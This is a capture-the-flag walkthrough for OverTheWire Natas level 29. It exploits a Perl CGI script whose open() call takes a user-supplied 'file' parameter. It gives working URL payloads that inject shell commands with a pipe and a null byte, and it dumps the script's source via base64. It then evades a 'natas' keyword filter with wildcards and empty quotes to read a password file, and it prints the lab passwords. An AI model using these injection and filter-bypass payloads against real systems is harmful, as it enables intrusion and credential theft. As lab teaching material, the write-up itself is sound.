# Natas Level 29

> Username: natas29

> Password: hwgoYUiGWoSZAqphtCAZf7u1jS16KEah

> URL: http://natas29.natas.labs.overthewire.org

## Solution

Entering the URL, we found a leet-speak and a dropdown menu. And you can also notice the parameter `file=` if you select something from the dropdown menu. Also there is no source code. But we know it's written via `perl`.

Probably the vulnerability is in the `file` parameter. 
After trying a few techniques we notice by prepending a pipe `|` and appending a URL-encoded null byte `%00`, you establish command injection. You try it using:

```text
http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
```

```text
index.pl
perl underground 2.txt
perl underground 3.txt
perl underground 4.txt
perl underground 5.txt
perl underground.txt
```

But it's not that easy because we can't read `/etc/natas_webpass/natas30`. That means there is some filtration. So we have to read `index.pl` to see what's happening.

We used `| cat index.pl | base64%00` so that the output didn’t get rendered as part of the web page.

```text
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20index.pl%20|%20base64%00
```

Then copy the Base64 string and decode it to have the source code.

```perl
#!/usr/bin/perl
use CGI qw(:standard);

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas29", "pass": "hwgoYUiGWoSZAqphtCAZf7u1jS16KEah" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<style>

#content {
    width: 1000px;
}
pre{
    background-color: #000000; 
    color: #00FF00; 
} 

</style>

<h1>natas29</h1>
<div id="content">
END
#
# morla /10111
# '$_=qw/ljttft3dvu{/,s/./print chr ord($&)-1/eg'
#
# credits for the previous level go to whoever 
# created insomnihack2016/fridginator, where i stole the idea from. 
# that was a fun challenge, Thanks! 
#

print <<END;
H3y K1dZ,<br>
y0 rEm3mB3rz p3Rl rit3?<br>
\\/\\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>

<form action="index.pl" method="GET">
<select name="file" onchange="this.form.submit()">
  <option value="">s3lEcT suMp1n!</option>
  <option value="perl underground">perl underground</option>
  <option value="perl underground 2">perl underground 2</option>
  <option value="perl underground 3">perl underground 3</option>
  <option value="perl underground 4">perl underground 4</option>
  <option value="perl underground 5">perl underground 5</option>
</select>
</form>

END

if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}

print <<END;
<div id="viewsource">c4n Y0 h4z s4uc3?</div>
</div>
</body>
</html>
END
```

That's it you can find the filtration:

```perl
if($f=~/natas/){
        print "meeeeeep!<br>";
    }
```

Our payload cannot contain `natas`. So to bypass it we must obfuscate the target file path `/etc/natas_webpass/natas30`.

There are two common methods to bypass it.

First: `Linux Wildcards (?)`. In Linux shells, the `?` character matches exactly one wildcard character. Replacing the `a` in both instances of `natas` tricks the web filter while allowing the underlying Linux shell to correctly resolve the file path.

```text
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/n?tas_webpass/n?tas30%00
```

Second: `Quoting / Concatenation`. Linux shell parsers remove quotes dynamically during command evaluation. Inserting empty double quotes `""` breaks up the string format for the web checker but resolves normally inside the terminal.

```text
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/na%22%22tas_webpass/nat%22%22as30%00
```

```text
frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF
```

